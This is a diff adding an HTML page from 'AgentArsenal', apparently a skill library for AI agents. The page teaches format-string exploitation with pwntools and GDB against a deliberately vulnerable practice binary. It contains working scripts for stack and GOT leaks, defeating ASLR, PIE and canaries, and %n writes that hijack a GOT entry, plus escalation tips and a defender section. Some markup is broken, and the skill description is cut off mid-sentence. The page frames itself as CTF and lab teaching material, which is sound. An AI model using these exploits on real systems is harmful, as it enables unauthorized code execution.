@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: format-strings</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>format-strings</h2><div class="meta"><span class="badge gray">binary</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you need to exploit a format string vulnerability on</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="pwn-fundamentals.html">pwn-fundamentals</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>pwntools</td><td>4.13</td></tr><tr><td>GDB</td><td>15.x</td></tr><tr><td>Python</td><td>3.12</td></tr><tr><td>gcc</td><td>14.x</td></tr></tbody></table><p>A format string vulnerability happens when user input is passed as the format argument to <code>printf</code> and friends instead of as a value to print. The attacker then controls the format specifiers: <code>%x</code> reads stack words, <code>%s</code> dereferences pointers, and <code>%n</code> writes the printed character count to a chosen address. That makes one bug both an arbitrary read and an arbitrary write. This skill covers the authorized workflow for finding and exploiting format string bugs with pwntools and GDB. All exploitation targets binaries you have written permission to test, such as CTF challenges or lab systems.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm the bug: user input reaches <code>printf(user_input)</code> with no</li>
+<p>format string.</p>
+<li>Find your positional parameter offset: which <code>%n$x</code> prints your own</li>
+<p>input back.</p>
+<li>Read the stack with <code>%x</code> to map interesting values: canary, saved</li>
+<p>registers, libc pointers.</p>
+<li>Leak addresses: use <code>%s</code> on GOT entries or stack pointers to defeat</li>
+<p>ASLR and PIE.</p>
+<li>Write with <code>%n</code>: overwrite a GOT entry or return address to hijack</li>
+<p>control flow.</p>
+<li>Automate with pwntools <code>fmtstr_payload</code> once the offset and target</li>
+<p>are known.</p>
+<li>Verify against the remote service, watching for output buffering and</li>
+<p>filter differences.</p>
+</ol>
+<h2>1. Confirm and find the offset</h2>
+<pre><code class="language-bash"># Build a practice binary with a format string bug
+cat &gt; fmt.c &lt;&lt;&#x27;EOF&#x27;
+#include &lt;stdio.h&gt;
+int main() {
+    char buf[128];
+    fgets(buf, sizeof(buf), stdin);
+    printf(buf);   // vulnerable: user input is the format string
+    return 0;
+}
+EOF
+gcc -no-pie -o fmt fmt.c
+
+# Confirm: %x specifiers print stack contents
+echo &#x27;AAAA.%x.%x.%x.%x&#x27; | ./fmt
+# Output like: AAAA.b7f... .&lt;stack words&gt; ... 41414141</code></pre>
+<p>The <code>41414141</code> in the output is your <code>AAAA</code> input visible on the stack. Count which position it appears at, or find it directly with positional parameters:</p>
+<pre><code class="language-bash"># Which position echoes our marker? Try positions until it appears
+for i in $(seq 1 20); do
+  printf &quot;START-%d-END %%%d\$x&quot; $i $i | ./fmt | grep -o &#x27;START-.*&#x27; | head -1
+done</code></pre>
+<p>pwntools automates offset discovery:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+def send_fmt(payload):
+    p = process(&#x27;./fmt&#x27;)
+    p.sendline(payload)
+    out = p.recvall(timeout=2)
+    p.close()
+    return out
+
+autofmt = FmtStr(send_fmt)
+print(&quot;offset:&quot;, autofmt.offset)  # positional parameter of our input</code></pre>
+<h2>2. Reading memory: stack and pointers</h2>
+<p>With the offset known, read arbitrary stack words:</p>
+<pre><code class="language-bash"># Dump 20 stack words starting at your offset (example offset 6)
+python3 -c &quot;print(&#x27;%6\$x.&#x27;*20)&quot; | ./fmt</code></pre>
+<p>Interpret the output: look for values that look like addresses (starting with <code>0x7f</code> for libc, <code>0x55</code> or <code>0x56</code> for the binary, <code>0x7ff</code> for the stack). A value ending in recognizable low bytes (like a return address into <code>__libc_start_main</code>) is a leak candidate.</p>
+<p>Read a pointed-to address with <code>%s</code>:</p>
+<pre><code class="language-bash"># GOT address of puts as an argument, then %&lt;offset&gt;$s reads it
+# (no PIE example: puts@got = 0x404018)
+python3 -c &quot;import struct,sys; sys.stdout.buffer.write(struct.pack(&#x27;&lt;Q&#x27;,0x404018) + b&#x27;%6\$s....&#x27;)&quot; | ./fmt | xxd | head -5</code></pre>
+<p>Caveats: <code>%s</code> stops at the first null byte, so leaked addresses print truncated if they contain <code>0x00</code> bytes in the middle (rare on 64-bit for libc addresses, but possible). If output looks cut, the leak still contains the low bytes; reconstruct the rest from alignment.</p>
+<p>A cleaner leak loop in Python:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF(&#x27;./fmt&#x27;)
+p = process(&#x27;./fmt&#x27;)
+
+def leak(addr):
+    p.sendline(b&#x27;AA&#x27; + p64(addr) + b&#x27; %7$s END&#x27;)
+    p.recvuntil(b&#x27;AA&#x27;)
+    data = p.recvuntil(b&#x27; END&#x27;, drop=True)
+    return data
+
+puts_got = exe.got[&#x27;puts&#x27;]
+leaked = leak(puts_got)
+print(&quot;puts @&quot;, hex(u64(leaked.ljust(8, b&#x27;\x00&#x27;))))</code></pre>
+<h2>3. Defeating ASLR and PIE with leaks</h2>
+<p>Two leaks cover almost every exploit:</p>
+<ul>
+<li>A libc leak: <code>%s</code> on a GOT entry (puts, printf) gives a libc</li>
+<p>address; subtract the symbol offset for libc base.</p>
+<li>A binary leak: a stack value that is a return address into the</li>
+<p>binary, or <code>%s</code> on a binary GOT entry, gives the binary base when PIE is on.</p>
+</ul>
+<pre><code class="language-python">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)
+puts_addr = u64(leak(exe.got[&#x27;puts&#x27;]).ljust(8, b&#x27;\x00&#x27;))
+libc.address = puts_addr - libc.symbols[&#x27;puts&#x27;]
+print(&quot;libc base:&quot;, hex(libc.address))</code></pre>
+<p>For PIE binaries, leak a binary address the same way. A stack return address into <code>main</code> works: compute <code>binary_base = leak - main_offset</code>, where <code>main_offset</code> comes from <code>objdump</code> or <code>exe.symbols[&#x27;main&#x27;]</code> (which is the offset when PIE is on).</p>
+<h2>4. Writing with %n</h2>
+<p><code>%n</code> writes the number of characters printed so far to the address given by the corresponding argument. Control the count with padding, and you have an arbitrary write.</p>
+<pre><code class="language-bash"># Write the value 64 to the address at position 6
+# %64c prints 64 chars, %6$n writes 64 to the 6th argument
+python3 -c &quot;import struct,sys; sys.stdout.buffer.write(struct.pack(&#x27;&lt;Q&#x27;,0x404018) + b&#x27;%64c%6\$n&#x27;)&quot; | ./fmt</code></pre>
+<p>Writing large values one byte at a time with <code>%hhn</code> (write one byte) is the practical approach: four <code>%hhn</code> writes build any 32-bit value without printing gigabytes of padding.</p>
+<pre><code class="language-python"># Manual 4-byte write of 0xdeadbeef to target, input at position 6
+# Split into bytes sorted ascending to keep padding positive:
+# ef(239) be(190) ad(173) de(222) -&gt; order: ad, be, de, ef
+writes = {0x404018+2: 0xad, 0x404018+1: 0xbe, 0x404018: 0xef, 0x404018+3: 0xde}</code></pre>
+<p>Doing this by hand is error-prone, which is why step 5 exists.</p>
+<h2>5. Automate with fmtstr_payload</h2>
+<p>pwntools builds the whole write payload from a dictionary of address-to-value pairs:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF(&#x27;./fmt&#x27;)
+p = process(&#x27;./fmt&#x27;)
+
+def send_payload(payload):
+    p.sendline(payload)
+    return p.recvall(timeout=2)
+
+# fmtstr_payload(offset, writes): offset = our positional parameter
+writes = {exe.got[&#x27;printf&#x27;]: exe.symbols[&#x27;win&#x27;]}
+payload = fmtstr_payload(6, writes)
+p.sendline(payload)
+p.interactive()</code></pre>
+<p>The classic target is a GOT entry: overwrite <code>printf@got</code> with the address of <code>win</code> or <code>system</code>, then trigger another <code>printf</code> call. On binaries with Full RELRO the GOT is read-only, so target a function pointer, a return address on the stack, or <code>.dtors</code>/<code>.fini_array</code> instead.</p>
+<p>For 64-bit values, <code>fmtstr_payload</code> handles the multi-write splitting internally. Verify the write took effect by leaking the target address back with a <code>%s</code> read before relying on it.</p>
+<h2>6. Putting it together: leak then write</h2>
+<p>The full pattern for a hardened binary (PIE + canary) is: leak the canary and PIE base with reads, then write with <code>%n</code>.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF(&#x27;./fmt_pie&#x27;)
+libc = ELF(&#x27;./libc.so.6&#x27;)
+p = process(&#x27;./fmt_pie&#x27;)
+
+# Step 1: find offset (do once manually, hardcode after)
+OFFSET = 6
+
+# Step 2: leak stack canary (example: canary sits at a known stack position)
+p.sendline(b&#x27;%13$x&#x27;)   # tune the position by inspecting output
+canary = int(p.recvline().strip(), 16)
+print(&quot;canary:&quot;, hex(canary))
+
+# Step 3: leak a binary address for PIE base
+p.sendline(b&#x27;%15$x&#x27;)
+pie_leak = int(p.recvline().strip(), 16)
+exe.address = pie_leak - 0x1234  # offset of the leaked return site
+
+# Step 4: overwrite a GOT entry with win()
+writes = {exe.got[&#x27;printf&#x27;]: exe.symbols[&#x27;win&#x27;]}
+p.sendline(fmtstr_payload(OFFSET, writes))
+p.interactive()</code></pre>
+<p>Positions 13 and 15 are examples; every binary differs. Map your target&#x27;s stack once with a <code>%x</code> dump and annotate which position holds the canary (a value ending in <code>00</code> that does not look like an address) and which holds code pointers.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Output buffering hides leaks. If the program does not flush before</li>
+<p>reading the next input, responses arrive late or merged. Add <code>p.recv()</code> timeouts and match on markers, not line counts.</p>
+<li>The format function is <code>sprintf</code> into a fixed buffer, not <code>printf</code>.</li>
+<p>Your payload must fit the buffer, and <code>%n</code> writes still work, but you cannot see the output; use a blind write or a second info leak.</p>
+<li>Positional parameters (<code>%6$x</code>) are filtered but plain <code>%x</code> is not.</li>
+<p>Walk the stack sequentially instead, counting positions by hand.</p>
+<li>The binary strips or truncates at the first null byte. Keep the</li>
+<p>payload null-free: place addresses after the format string or use short writes that avoid <code>0x00</code> bytes.</p>
+<li><code>%n</code> is disabled by <code>_FORTIFY_SOURCE</code> (<code>%n</code> protection). Modern</li>
+<p>distributions may block <code>%n</code> in some contexts; check with a direct test before building the whole exploit around writes.</p>
+<li>Wide characters or Unicode input mangle the payload. Confirm the</li>
+<p>input path is byte-clean with an echo test before trusting leaks.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>You have a read but <code>%n</code> is blocked: use the leak to enable a</li>
+<p>different primitive. A libc leak plus a stack leak turns a separate buffer overflow into a full exploit (see pwn-fundamentals).</p>
+<li>You have a write but no useful leak: overwrite <code>printf@got</code> with</li>
+<p><code>system</code> blindly if you know the libc version, or overwrite a function pointer with a one_gadget and brute-force the ASLR bits on a forking service.</p>
+<li>The only format sink is in a rarely called function: trigger it</li>
+<p>repeatedly. Many CTF binaries let you call the vulnerable function in a loop, giving unlimited leak and write attempts.</p>
+<li>Full RELRO plus no function pointers in reach: write to</li>
+<p><code>.fini_array</code> (called at exit) or stack return addresses. Both need a stack address leak first.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders detect format string probing through <code>%x</code> and <code>%n</code> sequences in input logs and WAF rules, and through crash patterns when probes dereference bad pointers. The durable fix is never passing user input as the format string: <code>printf(&quot;%s&quot;, user_input)</code>. Compiler warnings (<code>-Wformat-security</code>) catch this at build time, and <code>_FORTIFY_SOURCE</code> adds runtime <code>%n</code> protection. For code review, grep for <code>printf(</code>, <code>sprintf(</code>, and <code>syslog(</code> calls where the format argument is a variable rather than a string literal; each one is a candidate.</p>
+<h2>Key references</h2>
+<ul>
+<li>CWE-134 (Use of Externally-Controlled Format String).</li>
+<li>CWE-787 (Out-of-bounds Write): what <code>%n</code> becomes.</li>
+<li>CWE-200 (Exposure of Sensitive Information): what <code>%x</code> leaks become.</li>
+<li>MITRE ATT&amp;CK T1068 (Exploitation for Privilege Escalation).</li>
+<li>pwntools fmtstr docs: https://docs.pwntools.com/en/stable/fmtstr.html</li>
+<li>OWASP: Format String Attack: https://owasp.org/www-community/attacks/Format_string_attack</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
